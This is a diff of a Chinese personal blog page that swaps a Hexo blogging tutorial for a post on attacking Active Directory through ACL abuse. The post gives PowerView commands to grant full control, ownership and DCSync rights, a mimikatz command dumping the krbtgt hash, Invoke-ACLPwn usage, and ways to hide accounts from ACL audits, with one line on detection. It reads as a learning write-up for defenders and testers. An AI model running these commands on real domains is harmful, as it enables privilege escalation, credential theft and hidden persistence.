@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>用Github+Hexo搭建一个属于自己的博客 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="用Github+Hexo搭建一个属于自己的博客 | 九世的博客">
+  <title>AD域里的ACL攻防 | 九世的博客</title>
+  <meta name="keywords" content=" 内网渗透 ">
+  <meta name="description" content="AD域里的ACL攻防 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1446,9 +1446,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-用Github-Hexo搭建一个属于自己的博客" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-AD域里的ACL攻防" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">用Github+Hexo搭建一个属于自己的博客</h1>
+        <h1 class="article-title">AD域里的ACL攻防</h1>
     
     <div class="article-meta">
         
@@ -1457,14 +1457,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">内网渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-07-24 21:08</time>
+        创建时间:<time class="date" title="更新时间: 2020-08-02 17:44:13">2020-08-02 16:39</time>
         
     </div>
     <div class="article-meta">
@@ -1486,7 +1486,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DACL"><span class="toc-text">DACL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SACL"><span class="toc-text">SACL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACE"><span class="toc-text">ACE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access-Mask"><span class="toc-text">Access Mask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TrusteesTrustees"><span class="toc-text">TrusteesTrustees</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AD域里常见可利用的ACl"><span class="toc-text">AD域里常见可利用的ACl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用到的工具"><span class="toc-text">用到的工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GenericAll"><span class="toc-text">GenericAll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GenericWrite-写入全部属性"><span class="toc-text">GenericWrite (写入全部属性)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteDacl"><span class="toc-text">WriteDacl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Self-Membership"><span class="toc-text">Self-Membership</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteProperty-Self-Membership"><span class="toc-text">WriteProperty (Self-Membership)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteProperty-on-Group"><span class="toc-text">WriteProperty on Group</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WriteOwner"><span class="toc-text">WriteOwner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#给一个用户添加DCSync权限"><span class="toc-text">给一个用户添加DCSync权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#针对DACL的隐身方式"><span class="toc-text">针对DACL的隐身方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#各种ACL后门"><span class="toc-text">各种ACL后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御ACL修改"><span class="toc-text">防御ACL修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1501,51 +1501,97 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>在博客园写的博文和别人用github+hexo搭建起来的对比。感觉别人的好高大上= =，然后昨天晚上黑哥也在搞看的我也想搞。就有了以下的故事<br>虽然之前按照车王的方法失败了一次，但是还是死心不改在试一次，后面成功了。<br><br>我的环境：OS:Ubuntu<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=257909425,2915417066&amp;fm=27&amp;gp=0.jpg" alt=""></p>
-<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><hr>
-<p>首先你得拥有一个属于你的Github账号，如果没有就去注册<br><br>Github官网：<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a></p>
-<p>注册好之后，去新建一个项目。为<username>github.io,必须是你的username。否则会有很多的麻烦<br></username></p>
-<p><img src="https://i.imgur.com/LkZquwd.png" alt=""></p>
-<p>然后你在你电脑里面安装Git,nodejs,hexo,npm<br></p>
-<ol>
-<li>windows安装Git：<a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a> Git官网自行下载安装<br></li>
-<li>Linux下安装： sudo apt-get install git<br></li>
-<li>windows安装nodejs：<a href="https://www.cnblogs.com/hackyo/p/8110951.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackyo/p/8110951.html</a> //安装nodejs教程和npm教程<br></li>
-<li>Linux下安装nodejs：<a href="https://blog.csdn.net/u014361775/article/details/78865582" target="_blank" rel="noopener">https://blog.csdn.net/u014361775/article/details/78865582</a> //安装nodejs和npm教程<br></li>
-<li>安装hexo：npm i -g hexo<br></li>
-<li>查看hexo是否安装成功：hexo -v<br></li>
-<li>hexo初始化：hexo init<br><br>初始化之后你的目录下会出现以下文件夹：<br><br><img src="https://i.imgur.com/YsKwGqW.png" alt=""><br>node_modules：是依赖包<br><br>public：存放的是生成的页面<br><br>scaffolds：命令生成文章等的模板<br><br>source：用命令创建的各种文章<br><br>themes：主题<br><br>_config.yml：整个博客的配置<br><br>db.json：source解析所得到的<br><br>package.json：项目所需模块项目的配置信息<br></li>
-</ol>
-<p>干好之后就开始配置你的hexo了，打开_config.yml配置文件,进行更改。<br><br><img src="https://i.imgur.com/37KDIEA.png" alt=""><br>然后下载你喜欢的模板进行替换，模板在hexo官网自己挑选下载到themes里面。修改根目录下的_config.yml找到themes进行模板替换<br><br>替换完之后预览一下效果。<br><br>hexo clean<br><br>hexo generate<br><br>hexo server<br><br>打开浏览器访问：<a href="http://127.0.0.1:4000" target="_blank" rel="noopener">http://127.0.0.1:4000</a><br><br>我这里的主题是仙人掌大法<br><br><img src="https://i.imgur.com/i3Fumv1.png" alt=""><br>做好这些以后，你得创建ssh<br><br>在gitbash中输入：ssh-keygen -t rsa -C “<a href="mailto:youremail@example.com" target="_blank" rel="noopener">youremail@example.com</a>，生成ssh。然后按下图的方式找到id_rsa.pub文件的内容。<br><br>然后去github找到setting添加ssh key。<br><br><img src="https://i.imgur.com/tNcZBqg.png" alt=""><br>在gitbash中验证是否添加成功：ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><br>完成下一步你就成功啦！<br><br>安装deploy<br><br>npm install hexo-deployer-git –save<br><br>安装之后，去修改你的_config.yml下的deploy。<br>类似于这样子的：<br></p>
-<pre><code>deploy:
-      type:git
-    repository:git@github.com:422926799/422926799.github.io.git
-    branch:master
-</code></pre><p>弄好之后执行：hexo d -g 即可部署你的博客。访问<a href="https://xxx.github.io就能看到了。" target="_blank" rel="noopener">https://xxx.github.io就能看到了。</a><br>hexo的基本命令：</p>
-<pre><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章
-hexo p == hexo publish
-hexo g == hexo generate#生成
-hexo s == hexo server #启动服务预览
-hexo d == hexo deploy#部署
-hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。
-hexo server -s #静态模式
-hexo server -p 5000 #更改端口
-hexo server -i 192.168.1.1 #自定义 IP
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484058598&auto=1&height=66"></iframe>
 
-hexo clean #清除缓存 网页正常情况下可以忽略此条命令
-hexo g #生成静态网页
-hexo d #开始部署
-
-hexo new &quot;postName&quot; #新建文章
-hexo new page &quot;pageName&quot; #新建页面
-hexo generate #生成静态页面至public目录
-hexo server #开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）
-hexo deploy #将.deploy目录部署到GitHub
-
-hexo new [layout] &lt;title&gt;
-hexo new photo &quot;My Gallery&quot;
-hexo new &quot;Hello World&quot; --lang tw
-</code></pre><p><strong><br>转载请注明：来只422926799.github.io。</strong></p>
+<p>最近文章都写星球了，所以没怎么更新。昨天看到了安全客一篇说AD域里的ACL攻防<br>学习到了，写篇文章更新一下<br>原文地址：<a href="https://www.anquanke.com/post/id/212163#h3-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212163#h3-19</a><br><strong>注意：有些图和文字来自安全客</strong></p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
+<p>首先想要了解ACL首先需要了解Access Control Model（访问控制模型），根据官网（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：</a><br>访问控制模型能够控制进程访问一些安全对象，或者是控制进程执行各种系统管理任务。原文：The access control model enables you to control the ability of a process to access securable objects or to perform various system administration tasks。<br>用通俗一点的话来说ACM就是一个判断你在一个档案馆（在这里可以理解为整个域）里是否有权限打开某个档案抽屉（用户对象、用户组对象、Computer对象），并且是否能在这个档案抽屉中取走、存放、修改档案（读、写、修改）的一个模型。</p>
+</blockquote>
+<p>访问模型包含哪些部分：<br>1、Access Tokens（访问tokens）<br>2、Security Descriptors（安全描述符）<br>a、Discretionary Access Control List (DACL)<br>b、System Access Control List (SACL)<br>Access Control Lists（ACL）<br>Access Control Entries（ACE）<br>Access Rights and Access Masks（访问权限和访问掩码）</p>
+<p><strong>Access Token</strong><br>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包括用户的SID、所在组的SID等等信息</p>
+<p><strong>Security Descriptors安全描述符</strong><br>SID（Security Identifiers）即安全描述符。<br>安全描述符标识对象的所有者，并包含以下访问控制列表：<br>1、Discretionary Access Control List (DACL) 自由访问控制列表<br>2、System Access Control List (SACL) 系统访问控制列表</p>
+<p>每一种控制列表中都存在若干条ACE（Access Control Entries）<br><img src="https://s1.ax1x.com/2020/08/02/aYyOMQ.png" alt=""></p>
+<p>一张图描述<br><img src="https://s1.ax1x.com/2020/08/02/aY6PRU.png" alt=""></p>
+<h2 id="DACL"><a href="#DACL" class="headerlink" title="DACL"></a>DACL</h2><p>高级安全设置中的权限就是DACL的列表<br><img src="https://s1.ax1x.com/2020/08/02/aY61Qe.png" alt=""></p>
+<h2 id="SACL"><a href="#SACL" class="headerlink" title="SACL"></a>SACL</h2><p>高级安全设置中的审核就是SACL的列表<br><img src="https://s1.ax1x.com/2020/08/02/aY62F0.png" alt=""></p>
+<p>其中红色圈出来的每一条都是一条ACE</p>
+<h2 id="ACE"><a href="#ACE" class="headerlink" title="ACE"></a>ACE</h2><p>ACE是针对特定用户或特定组的单个权限授予（或拒绝权利）的配置结构。ACE有许多不同类型，但是在Active Directory的权限中，只有四种不同的含义，两种分别用于授予和拒绝权限。</p>
+<h2 id="Access-Mask"><a href="#Access-Mask" class="headerlink" title="Access Mask"></a>Access Mask</h2><p>Access Mask在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限，比如完全控制（GenericAll）、修改密码（ResetPassword）、写入属性（WriteMembers）等等。<br><img src="https://s1.ax1x.com/2020/08/02/aYc90A.png" alt=""></p>
+<h2 id="TrusteesTrustees"><a href="#TrusteesTrustees" class="headerlink" title="TrusteesTrustees"></a>TrusteesTrustees</h2><p>TrusteesTrustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。比如下面这一条的受委托人实际上就是zhangs账号。<br><img src="https://s1.ax1x.com/2020/08/02/aYcEp8.png" alt=""></p>
+<h2 id="AD域里常见可利用的ACl"><a href="#AD域里常见可利用的ACl" class="headerlink" title="AD域里常见可利用的ACl"></a>AD域里常见可利用的ACl</h2><ul>
+<li>GenericAll ：拥有一个可以完全控制用户/组的权限</li>
+<li>GenericWrite ：此权限能够更新目标对象的属性值</li>
+<li>Self-Membership ：这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</li>
+<li>WriteProperty ：WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限</li>
+<li>WriteOwner ：WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限</li>
+<li>WriteDacl ：WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。</li>
+</ul>
+<h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><p>ADSI编辑器<br>powerview</p>
+<h2 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h2><p><strong>GenericAll on User</strong><br>使用powerview添加ACL或者手动</p>
+<pre><code class="text">Add-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity yayi -Rights All -Verbose
+</code></pre>
+<p>这个权限可以完全控制用户<br><img src="https://s1.ax1x.com/2020/08/02/aY2ELQ.png" alt=""></p>
+<p>给予了yayi对zhangs用户完全控制的权限，在查看zhangs的时候可以发现yayi的SID在查询里出现了<br><img src="https://s1.ax1x.com/2020/08/02/aY2MWV.png" alt=""></p>
+<p>此时使用yayi的用户可以修改zhangs用户密码<br><img src="https://s1.ax1x.com/2020/08/02/aY21QU.png" alt=""></p>
+<p><strong>GenericAll on Group</strong><br>环境和上文相同，GenericAll on Group说的是对一个组有GenericAll权限，查看用户组domain admins：<br>（yayi是新增加的）<br><img src="https://s1.ax1x.com/2020/08/02/aY2BQO.md.png" alt=""></p>
+<p>powerview将yayi用户添加到domain admins用户添加</p>
+<pre><code class="text">Add-DomainObjectAcl  -TargetIdentity &quot;domain admins&quot; -PrincipalIdentity yayi -Rights  all -Verbose
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/08/02/aY22FI.png" alt=""></p>
+<p>添加yayi用户的ACL全部控制权限后查看<br><img src="https://s1.ax1x.com/2020/08/02/aY24l8.png" alt=""></p>
+<p>可以用yayi用户控制domain admins用户组<br><img src="https://s1.ax1x.com/2020/08/02/aY5TmT.png" alt=""></p>
+<h2 id="GenericWrite-写入全部属性"><a href="#GenericWrite-写入全部属性" class="headerlink" title="GenericWrite (写入全部属性)"></a>GenericWrite (写入全部属性)</h2><p>GenericWrite也是在Access Mask中进行标识，此权限能够更新目标对象的属性值，可以使用PowerView中的Set-DomainObject方法设置目标属性的值。<br><img src="https://s1.ax1x.com/2020/08/02/aY5Oh9.png" alt=""></p>
+<blockquote>
+<p>如果您在计算机对象上具有这些特权，那么您可以拉出Kerberos基于资源的受限委托:计算机对象接管。<br>参考链接：<a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></p>
+</blockquote>
+<p>修改别的属性</p>
+<pre><code>Set-DomainObject zhangs -Set @{&#39;scriptPath&#39;=&#39;雷电芽衣&#39;} -Verbose
+</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYop2n.png" alt=""></p>
+<h2 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h2><p>WriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。<br><img src="https://s1.ax1x.com/2020/08/02/aYoGIe.png" alt=""></p>
+<p>个人感觉WriteDacl和GenericWrite没什么区别</p>
+<pre><code>Set-DomainObject zhangs -Set @{&#39;scriptPath&#39;=&#39;雷电女王&#39;} -Verbose
+</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYodMt.png" alt=""></p>
+<h2 id="Self-Membership"><a href="#Self-Membership" class="headerlink" title="Self-Membership"></a>Self-Membership</h2><p>这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)<br>重点：主体、添加/删除自身作为成员</p>
+<p><img src="https://s1.ax1x.com/2020/08/02/aYohLV.png" alt=""></p>
+<p>此时查看dnsadmins用户组可以看到test用户的sid在dnsadmins里看到了<br><img src="https://s1.ax1x.com/2020/08/02/aYoHJJ.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/08/02/aYoqzR.png" alt=""></p>
+<h2 id="WriteProperty-Self-Membership"><a href="#WriteProperty-Self-Membership" class="headerlink" title="WriteProperty (Self-Membership)"></a>WriteProperty (Self-Membership)</h2><p>WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限，在Domain Admins组里设置zhangs账户的WriteProperty权限<br>WriteProperty和Self-Membership一样 (设置的地方一模一样或者直接设置权限为：添加/删除自身作为成员)<br>（也可以添加其他用户进控制的组）</p>
+<p><img src="https://s1.ax1x.com/2020/08/02/aYT9Fe.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/08/02/aYTkQI.md.png" alt=""></p>
+<h2 id="WriteProperty-on-Group"><a href="#WriteProperty-on-Group" class="headerlink" title="WriteProperty on Group"></a>WriteProperty on Group</h2><p>WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限：<br>CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner<br>设置一个组的写入全部属性<br>（相当于获取了这个组的所有权限）<br><img src="https://s1.ax1x.com/2020/08/02/aYT8O0.png" alt=""></p>
+<h2 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h2><p>WriteOwner权限允许委托人修改对象的安全描述符的所有者部分。也就是说，假如用户A对administrator用户有这个权限，那么A能利用这个权限给自己附加其他的权限。</p>
+<p>将zhangs用户的所有者设置为test，并给予test用户完全的控制权限</p>
+<pre><code>Set-DomainObjectOwner -Identity S-1-5-21-447451162-2905414466-2158217208-1149 -OwnerIdentity &quot;test&quot; -Verbose
+Add-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity test -Rights All -Verbose
+</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYT0p9.png" alt=""></p>
+<h2 id="给一个用户添加DCSync权限"><a href="#给一个用户添加DCSync权限" class="headerlink" title="给一个用户添加DCSync权限"></a>给一个用户添加DCSync权限</h2><p>给予test用户：复制目录更改Replicating Directory Changes (DS-Replication-Get-Changes)、 复制目录更改所有Replicating Directory Changes All (DS-Replication-Get-Changes-All)（Exchange用的就是这个）权限</p>
+<pre><code>Add-DomainObjectAcl -TargetIdentity &quot;DC=DOMAIN,DC=local&quot; -PrincipalIdentity test -Rights DCSync
+</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYT70f.png" alt=""></p>
+<p>使用mimikatz导出krbtgt用户的hash</p>
+<pre><code>mimikatz.exe &quot;lsadump::dcsync /user:DOMAIN\krbtgt&quot; &quot;exit&quot;
+</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aY7pn0.png" alt=""></p>
+<p><strong>Invoke-ACLPwn</strong><br>运行时需要.NET 3.5环境，Windows Server 2012安装遇到报错，最后的解决方法(需要在网上下载SxS的安装包<a href="https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：" target="_blank" rel="noopener">https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：</a></p>
+<p>dism.exe /online /enable-feature /all /featurename:NetFX3 /Source:F:\Sources\SxS\</p>
+<p>GitHub地址：<a href="https://github.com/fox-it/Invoke-ACLPwn" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-ACLPwn</a><br>背景信息在发布者博客上：<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a><br>环境需要：</p>
+<p>.NET 3.5 + sharphound.exe + mimikatz.exe</p>
+<p>用法示例：</p>
+<pre><code>.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync
+.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe
+.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn &#39;Administrator&#39;
+.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile
+.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup
+.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username &#39;testuser&#39; -Domain &#39;xenoflux.local&#39; -Password &#39;Welcome01!&#39;
+</code></pre><p>使用第一条标识了-NoDCSync（不会做DCSync的动作，只判断是否能够存在能够DCSync的权限）的命令<br>administrator用户检测出来了其他用户报错<br><img src="https://s1.ax1x.com/2020/08/02/aY7uB6.png" alt=""></p>
+<p>文章上的图<br><img src="https://s1.ax1x.com/2020/08/02/aY7Lb6.png" alt=""></p>
+<h2 id="针对DACL的隐身方式"><a href="#针对DACL的隐身方式" class="headerlink" title="针对DACL的隐身方式"></a>针对DACL的隐身方式</h2><p>通过隐藏账户可以掩盖主体本身，阻止防御者轻易的发现谁实际上拥有ACE中指定的权限。这种方式主要应对的是对于高危的ACL进行扫描行为。<br>隐藏用户</p>
+<p>1、将要隐藏的用户所有者改为攻击者或者攻击者控制的账户<br>2、设置一条拒绝完全控制的ACE<br>添加SELF用户和Everyone用户拒绝类型，将要修改的组/用户名的所有者改为攻击者控制的用户名<br><img src="https://s1.ax1x.com/2020/08/02/aYHgRH.png" alt=""><br>之后就会变成一片空白,powerview也查不到</p>
+<pre><code>Get-DomainObjectAcl -Identity user01 -domain DOMAIN.local -Resolve
+</code></pre><p><img src="https://s1.ax1x.com/2020/08/02/aYblSH.md.png" alt=""></p>
+<h2 id="各种ACL后门"><a href="#各种ACL后门" class="headerlink" title="各种ACL后门"></a>各种ACL后门</h2><pre><code>* GPO ACL后门
+* ACL Dcsync后门
+</code></pre><p>具体参考文章</p>
+<h2 id="防御ACL修改"><a href="#防御ACL修改" class="headerlink" title="防御ACL修改"></a>防御ACL修改</h2><p>关注日志里的5136事件</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/212163#h3-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212163#h3-19</a><br><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces" target="_blank" rel="noopener">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1555,12 +1601,12 @@ hexo new &quot;Hello World&quot; --lang tw
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>用Github+Hexo搭建一个属于自己的博客</p>
+    <p><span class="copy-title">文章标题:</span>AD域里的ACL攻防</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-07-24, 21:08:54</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5358472d.html" title="用Github+Hexo搭建一个属于自己的博客">http://422926799.github.io/posts/5358472d.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-08-02, 16:39:09</p>
+    <p><span class="copy-title">最后更新:</span>2020-08-02, 17:44:13</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/be9dae0a.html" title="AD域里的ACL攻防">http://422926799.github.io/posts/be9dae0a.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
